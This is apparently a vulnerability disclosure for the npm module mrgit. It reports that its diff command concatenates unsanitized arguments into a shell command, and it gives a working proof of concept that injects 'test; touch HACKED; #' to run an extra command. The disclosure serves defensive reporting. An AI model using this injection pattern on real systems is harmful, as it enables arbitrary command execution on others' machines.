# Description

The `mrgit` module is vulnerable against `RCE` since some `inputs` are concatenated without sanitization to a `command` that is executed

# POC

1. Create the following PoC file:

```js
// poc.js
const diff = require( 'mrgit/lib/commands/diff' );
diff.execute({arguments:['test; touch HACKED; #'], toolOptions:{packages:'', }, repository:{directory:''}})

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i mrgit # Install affected module
git init # Initializes the current directory as *git* dir
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
